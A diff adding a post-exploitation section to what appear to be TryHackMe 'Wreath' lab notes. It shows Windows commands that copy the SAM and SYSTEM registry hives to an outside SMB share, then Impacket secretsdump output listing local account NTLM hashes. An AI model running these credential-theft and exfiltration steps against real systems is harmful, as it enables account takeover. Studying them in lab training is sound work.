@@ -3297,3 +3297,47 @@ C:\Windows\system32>
 ```
 
 </details>
+
+## 30. Exfiltration Techniques & Post Exploitation
+
+<details>
+  <summary>---</summary>
+
+Exfiltrate hashes
+
+```
+
+C:\Windows\system32>net use \\10.50.86.79\share /USER:user hellotheretaco
+net use \\10.50.86.79\share /USER:user hellotheretaco
+The command completed successfully.
+
+
+C:\Windows\system32>reg.exe save HKLM\SAM \\10.50.86.79\share\sam.bak
+reg.exe save HKLM\SAM \\10.50.86.79\share\sam.bak
+The operation completed successfully.
+
+C:\Windows\system32>reg.exe save HKLM\SYSTEM \\10.50.86.79\share\system.bak 
+reg.exe save HKLM\SYSTEM \\10.50.86.79\share\system.bak
+The operation completed successfully.
+
+```
+
+Use `Impacket`
+```
+kali@kali:~/thm/wreath$ ls sam* system*
+sam.bak  system.bak
+
+kali@kali:~/thm/wreath$ python3 ~/code/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+[*] Cleaning up... 
+```
+
+</details>
